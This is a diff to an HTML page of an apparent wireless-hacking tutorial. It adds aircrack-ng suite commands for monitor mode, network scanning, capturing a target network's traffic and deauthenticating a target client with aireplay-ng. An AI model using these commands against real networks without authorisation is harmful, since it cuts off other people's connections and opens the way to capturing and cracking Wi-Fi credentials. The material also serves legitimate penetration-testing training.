@@ -34,9 +34,21 @@
     <h3>>> Scanning</h2>
     <p>For scanning around network you need to enable monitor mode on your wireless network adapter.</p>
     <label><h4>• Enable Monitor Mode</h4></label>
-    <p><ol><b><li><a href="/tools/aircrack-ng.html">Airmon-ng</a>:</li></b> To start monitor mode cmd,<br><br><i>  $ airmon-ng start {interface name}</i><br><b>Example: </b>airmon-ng start wlan0 </ol></p>
-  </div>
+    <p><ol><b><li><a href="/tools/aircrack-ng.html#airmon-ng">Airmon-ng</a>:</li></b> To start monitor mode cmd,<br><br><i>  $ airmon-ng start {interface name}</i><br><b>Example: </b>airmon-ng start wlan0 <br><br>
+      To stop monitor mode cmd,<br><br><i>  $ airmon-ng stop {interface name}</i><br><b>Example: </b>airmon-ng stop wlan0 </ol></p>
+      
+      
+    <h4>• Scanning Network</h4>
+    <ul><li><b><a href="/tools/aircrack-ng.html#airodump-ng">Airodump-ng</a></b></li><li>To see available wireless network<br><b><i>$ airodump-ng {interface}</i></b></li>
+    <br>
+    <li>To scan target network<br><i><b>airodump-ng --bssid {BSSID} --channel {ch_number} --write {file_name} {interface}</b></i></li></ul>
   
+  
+    <h4>• Deauthenticate Targets from network</h4>
+    <ul><li><a href="/tools/aircrack-ng.html#aireplay-ng"><b>Aireplay-ng</b></a><br><li>To Deauthenticate Target</li><br><b><i>$ aireplay-ng --deauth {num_pckt} -a {router_bssid} -c {target_bssid} {interface}</i></b></li></ul>
+  
+  
+  </div>
 </body>
 
 </html>
